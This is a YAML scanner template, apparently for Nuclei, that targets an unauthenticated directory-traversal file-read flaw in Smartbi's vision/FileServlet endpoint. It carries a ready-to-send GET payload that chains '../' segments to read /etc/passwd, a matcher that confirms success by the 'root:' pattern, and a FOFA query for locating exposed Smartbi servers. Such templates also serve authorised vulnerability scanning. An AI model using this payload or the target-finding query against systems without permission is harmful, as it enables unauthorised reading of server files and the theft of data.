id: smartbi-bi-readfile

info:
  name: Smartbi FileServlet 任意文件读取
  author: xpoc
  severity: high
  description: |
    Smartbi vision/FileServlet 接口 path 参数存在目录穿越，未授权可读取服务器任意文件。
  metadata:
    max-request: 2
    fofa-query: app="SMARTBI"
  tags: smartbi,lfi,fileread

http:
  - method: GET
    path:
      - '{{BaseURL}}/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx'
      - '{{BaseURL}}/smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx'

    stop-at-first-match: true
    host-redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'

      - type: status
        status:
          - 200
